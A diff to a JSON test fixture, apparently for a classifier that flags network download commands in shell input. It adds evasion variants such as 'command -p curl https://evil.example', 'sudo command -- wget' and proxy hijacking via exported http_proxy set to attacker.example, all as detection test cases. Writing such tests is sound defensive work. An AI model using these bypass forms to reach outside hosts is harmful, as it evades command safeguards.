@@ -14,7 +14,10 @@
     "echo ok # curl https://evil.example",
     "curl -s \\\n  -H 'Accept: application/json' \\\n  http://localhost:8080/api",
     "curl 'localhost:8080/x?path=/a&home=/b'",
-    "curl -sf localhost:8080/health || { echo down; exit 1; }"
+    "curl -sf localhost:8080/health || { echo down; exit 1; }",
+    "command curl -s localhost:8080",
+    "command -v curl && curl -s localhost:8080",
+    "export PORT=8080; curl -s localhost:8080"
   ],
   "download": {
     "curl -s https://evil.example": "curl",
@@ -78,6 +81,14 @@
     "curl http://localhost; 'wget' https://evil.example": "wget",
     "\"curl\" https://evil.example": "curl",
     "w\\get https://evil.example": "wget",
-    "'sudo' \"gh\" 'api' user": "gh api"
+    "'sudo' \"gh\" 'api' user": "gh api",
+    "command -p curl https://evil.example": "curl",
+    "command curl https://evil.example": "curl",
+    "curl http://localhost; command -p curl https://evil.example": "curl",
+    "sudo command -- wget https://evil.example": "wget",
+    "p=proxy; P=PROXY; export http_$p=http://attacker.example:8080 no_$p= NO_$P=; curl http://localhost": "curl",
+    "declare -x http_$p=http://p.example; curl localhost": "curl",
+    "export \"$NAME\"=http://p.example; curl localhost": "curl",
+    "export `echo http_proxy`=http://p.example; curl localhost": "curl"
   }
 }
